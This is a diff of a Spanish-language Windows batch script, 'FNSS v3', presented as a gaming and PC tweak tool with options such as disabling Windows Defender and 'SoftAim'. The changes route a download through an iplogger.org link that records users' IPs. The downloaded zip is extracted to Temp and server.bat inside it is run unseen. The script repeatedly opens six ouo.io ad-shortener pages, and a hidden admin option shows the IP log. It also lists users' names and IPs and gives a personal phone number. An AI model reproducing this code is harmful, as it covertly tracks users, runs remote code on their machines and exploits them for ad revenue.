@@ -6,15 +6,22 @@ if NOT %ERRORLEVEL% EQU 0 goto NotAdmin
 goto solopara 
 
 :NotAdmin
+color 5
+title OPEN WITH ADMINISTRATOR!!
+cls
 echo.
-echo Not opened with Adminitrator
+echo  [-] Not opened with Adminitrator.
+echo  [+] Not Support Windows below 20H2.
+echo  [-] Maybe u can get issues if u have installed OneDrive.
 echo.
-pause
+pause >nul
 exit
 
 :: ============================= PCs Registradas para usar el programa =============================
 
 :solopara
+color 5
+title Connecting FNSS server...
 echo.       
 for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 echo Network IP: %NetworkIP%
@@ -35,23 +42,23 @@ if not exist "DEBUG.bat" goto skip4
 
 
 :skip4
-echo set netip=192.168.1.124> "DEBUG.dll"
-echo set netip=192.168.0.16>> "DEBUG.dll"
-echo set netip=192.168.0.5>> "DEBUG.dll"
-echo set netip=192.168.1.3>> "DEBUG.dll"
-echo set netip=maiko>> "DEBUG.dll"
-echo set netip=Skrt Killero>> "DEBUG.dll"
-echo set netip=alanc>> "DEBUG.dll"
-echo set netip=santy>> "DEBUG.dll"
-echo set netip=Yesid>> "DEBUG.dll"
-echo set netip=unrx>> "DEBUG.dll"
-echo set netip=mayko>> "DEBUG.dll"
-echo set netip=carlos cabassa>> "DEBUG.dll"
-echo set netip=Raul>> "DEBUG.dll"
-echo set netip=GAMER>> "DEBUG.dll"
-echo set netip=ESMERLIN MARTE>> "DEBUG.dll"
-echo set netip=Adrian>> "DEBUG.dll"
-echo set netip=Richita12321233123>> "DEBUG.dll"
+echo set netip=192.168.1.124> "DEBUG.bat"
+echo set netip=192.168.0.16>> "DEBUG.bat"
+echo set netip=192.168.0.5>> "DEBUG.bat"
+echo set netip=192.168.1.3>> "DEBUG.bat"
+echo set netip=maiko>> "DEBUG.bat"
+echo set netip=Skrt Killero>> "DEBUG.bat"
+echo set netip=alanc>> "DEBUG.bat"
+echo set netip=santy>> "DEBUG.bat"
+echo set netip=Yesid>> "DEBUG.bat"
+echo set netip=unrx>> "DEBUG.bat"
+echo set netip=mayko>> "DEBUG.bat"
+echo set netip=carlos cabassa>> "DEBUG.bat"
+echo set netip=Raul>> "DEBUG.bat"
+echo set netip=GAMER>> "DEBUG.bat"
+echo set netip=ESMERLIN MARTE>> "DEBUG.bat"
+echo set netip=Adrian>> "DEBUG.bat"
+echo set netip=Richita12321233123>> "DEBUG.bat"
 
 
 goto call2
@@ -100,12 +107,14 @@ goto download1
 ::https://github.com/maikyes/server/archive/main8.zip
 
 :download1
-bitsadmin /transfer "FNSS Check2" /download /priority foreground https://iplogger.org/2umud6 "C:\Users\%username%\AppData\Local\Temp\main8.zip"
+bitsadmin /transfer "FNSS Check2" /download /priority foreground https://iplogger.org/2aFdM5 "C:\Users\%username%\AppData\Local\Temp\main8.zip"
+cls
 powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\main8.zip'); $target.CopyHere($zip.Items(), 16); }"
 cls
 powershell -command "Expand-Archive main8.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp"
 cls
 xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\server-main8" "C:\Users\%username%\AppData\Local\Temp"
+cls
 cd C:\Users\%username%\AppData\Local\Temp
 CALL "server.bat"
 goto check-22
@@ -121,18 +130,25 @@ goto serveroffline
 
 :serveroffline
 cls
+color 5
 echo.
-echo ==================================
-echo   FNSS Servers estan: %local9%
-echo ==================================
-timeout /NOBREAK /T 3 >nul
+echo  [+] FNSS Servers estan: %local9%
+echo  [+] Por falta de soporte se le enviara a 
+echo  [+] paginas de pago para seguir soportando los servers
+timeout /NOBREAK /T 5 >nul
+start https://ouo.io/XzM8oQ
+start https://ouo.io/zmoyTSf
+start https://ouo.io/vjTSwQ
+start https://ouo.io/t3jqN7Q
+start https://ouo.io/IHedSW
+start https://ouo.io/kaPz6L
 exit
 
 ::=========================::=ACTUALIZACION DE VERSION::=============================
 
 :fnssserver
 cd C:\Users\%username%\AppData\Local\Temp
-set local=47.0
+set local=48.0
 set new1=
 set new2=
 set new3=
@@ -211,20 +227,25 @@ echo.
 echo  WhatsApp: +1 305-812-1398
 echo  Discord: maik#2896
 echo.
+echo  -=[ $25 ]=-
+echo.
 echo  Gracias!
 echo ==================================================
 echo.
-pause
-timeout /NOBREAK /T 2 >nul
+timeout /NOBREAK /T 3 >nul
+
+start https://ouo.io/XzM8oQ
+start https://ouo.io/zmoyTSf
+start https://ouo.io/vjTSwQ
+start https://ouo.io/t3jqN7Q
+start https://ouo.io/IHedSW
+start https://ouo.io/kaPz6L
 
 cd C:\Users\%username%\Desktop
 rmdir /s /q "C:\Users\%username%\Desktop\FNSSv3.zip"
 del /f /q "C:\Users\%username%\Desktop\FNSSv3"
 del /f /q "C:\Users\%username%\Desktop\FNSSv3.zip"
 del /f /q "C:\Users\%username%\Desktop\FNSSv3.rar"
-rmdir /s /q "C:\Users\%username%\Desktop\FNSSv3\fnss-main"
-del /f /q "C:\Users\%username%\Desktop\fnss-main.zip"
-del /f /q "C:\Users\%username%\Desktop\fnss-main (1).zip"
 
 cd C:\Users\%username%\Downloads
 del /s /q "C:\Users\%username%\Downloads\FNSSv3.zip"
@@ -255,28 +276,28 @@ echo ============================
 echo.
 
 :: ============================= WORKING! =============================
-
+::                                                        https://ouo.io/KfWuTWp
 bitsadmin /transfer "FNSS" /download /priority foreground https://github.com/maikyes/fnss/archive/main.zip "C:\Users\%username%\AppData\Local\Temp\main.zip"
-
+cls
 powershell -command "Expand-Archive main.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp"
-
+cls
 powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\main.zip'); $target.CopyHere($zip.Items(), 16); }"
-
+cls
 
 
 
 xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\fnss-main" "C:\Users\%username%\Desktop\FNSSv3"
-
+cls
 xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\fnss-main" "C:\Users\%username%\Escritorio\FNSSv3"
-
+cls
 xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\fnss-main" "C:\Users\%username%\OneDrive\Desktop\FNSSv3"
-
+cls
 
 :: =======================================================================================
 
 
 cd C:\Users\%username%%\Documents\cmdacoBin
-echo x=msgbox("Updated! if you got a issues just dm me in discord maik#2896",0,"FNSS Announcement")>>msgbox.vbs
+echo x=msgbox("Updated! if you got a issues just dm me in discord maik#2896 or download by yourself through this link: https://ouo.io/KfWuTWp",0,"FNSS Announcement")>>msgbox.vbs
 start msgbox.vbs
 timeout /NOBREAK /T 2 >nul
 del /s /q C:\Users\%username%%\Documents\cmdacoBin\msgbox.vbs
@@ -305,11 +326,11 @@ echo   +   7: OFF/ON Windows Defender      + +  22: Windows Service Disabler    
 echo   +   8: Disk Clean-Up                + +  23: FiveM Priority               +                   
 echo   +   9: SoftAim                      + +                                   +    
 echo   +  10: Fix Ping Value    (Risky)    + +++++++++++++++++++++++++++++++++++++          
-echo   +  11: Bajar Ping        (Risky)    + %new1%                                           
-echo   +  12: Desactivar WindowsUpdates    + %new2%                           
-echo   +  13: IP Locations                 + %new3%                                            
-echo   +  14: Activar Gpedit               + %new4%                   
-echo   +  15: Nvidia Inspector  (Risky)    +                    
+echo   +  11: Bajar Ping        (Risky)    +                                           
+echo   +  12: Desactivar WindowsUpdates    + %new1%                           
+echo   +  13: IP Locations                 + %new2%                                           
+echo   +  14: Activar Gpedit               + %new3%             
+echo   +  15: Nvidia Inspector  (Risky)    + %new4%             
 echo   +                                   +                                
 echo   +++++++++++++++++++++++++++++++++++++
                           
@@ -346,6 +367,8 @@ if %opcion%==23 goto search2
 
 if %opcion%==admin goto adminmaik
 
+if %opcion%==S goto supore
+if %opcion%==s goto supore
 if %opcion%==co goto color2
 if %opcion%==b goto block
 if %opcion%==maik goto maik
@@ -361,7 +384,14 @@ cls
 goto menu1
 
 
-
+:supore
+start https://ouo.io/XzM8oQ
+start https://ouo.io/zmoyTSf
+start https://ouo.io/vjTSwQ
+start https://ouo.io/t3jqN7Q
+start https://ouo.io/IHedSW
+start https://ouo.io/kaPz6L
+goto menu1
 
 ::+=============================
 ::+ Para encontrar FiveM antes de iniciar la prioridad
@@ -498,9 +528,9 @@ goto menu1
 :adminmaik2
 cls
 echo.
-echo 1: Descargar IPs Registradas
+echo  [+] 1: IPs Registradas
 echo.
-set /p ad2="admin password: "
+set /p ad2="Number: "
 
 
 
@@ -513,7 +543,7 @@ timeout /NOBREAK /T 1 >nul
 goto adminmaik2
 
 :adip
-powershell.exe -Command wget https://iplogger.org/listfull/4naa72umud6 -OutFile C:\Users\%username%\Desktop\FNSSv3\ip100.png
+start https://iplogger.org/es/logger/7865272aFdM5/
 goto adminmaik2
 
 
@@ -1382,6 +1412,7 @@ goto soft
 
 
 :aim1
+start https://ouo.io/XzM8oQ
 cls
 echo.
 echo               -=[Installing.]=-
@@ -1404,6 +1435,7 @@ pause
 goto soft
 
 :aim2
+start https://ouo.io/XzM8oQ
 cls
 echo.
 echo               -=[Installing.]=-
@@ -1426,6 +1458,7 @@ pause
 goto soft
 
 :aim3
+start https://ouo.io/XzM8oQ
 cls
 echo.
 echo               -=[Installing.]=-
@@ -1448,6 +1481,7 @@ pause
 goto soft
 
 :aim4
+start https://ouo.io/XzM8oQ
 cls
 echo.
 echo               -=[Installing.]=-
@@ -1470,6 +1504,7 @@ pause
 goto soft
 
 :aim5
+start https://ouo.io/XzM8oQ
 cls
 echo.
 echo               -=[Loading.]=-
@@ -1491,7 +1526,7 @@ timeout /NOBREAK /T 2 >nul
 pause
 goto soft
 
-#################Block de notas#####################################
+::#################Block de notas#####################################
 
 :block
 @echo off>>DEBUG.txt
@@ -1516,7 +1551,7 @@ pause
 goto menu1
 
 
-####################################################################
+::####################################################################
 
 :diskup
 cls
